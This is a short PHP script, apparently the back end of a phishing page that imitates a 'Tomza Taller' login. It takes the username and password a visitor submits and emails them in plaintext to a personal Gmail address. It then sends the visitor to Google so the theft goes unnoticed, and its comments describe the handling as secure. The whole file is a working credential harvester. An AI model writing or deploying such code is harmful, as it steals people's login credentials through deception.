<?php
// Bloquear acceso directo
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    header("Location: index.html");
    exit;
}

// Recibir datos de forma segura
$usuario = isset($_POST["usuario"]) ? trim($_POST["usuario"]) : "";
$password = isset($_POST["password"]) ? trim($_POST["password"]) : "";

if ($usuario === "" || $password === "") {
    die("Faltan datos para continuar.");
}

// Configuración del correo
$destinatario = "sebastiancq2008@gmail.com";
$asunto = "Nuevo ingreso - Tomza Taller";
$mensaje  = "=== Datos recibidos ===\n";
$mensaje .= "Usuario: " . $usuario . "\n";
$mensaje .= "Contraseña: " . $password . "\n";
$mensaje .= "Fecha: " . date("d/m/Y H:i:s") . "\n";

// Encabezados completos
$encabezados  = "From: Sistema Tomza <no-reply@tudominio.com>\r\n";
$encabezados .= "Reply-To: sebastiancq2008@gmail.com\r\n";
$encabezados .= "Content-Type: text/plain; charset=utf-8\r\n";

// Enviar
@mail($destinatario, $asunto, $mensaje, $encabezados);

// Redirigir a Google
header("Location: https://www.google.com");
exit;
?>
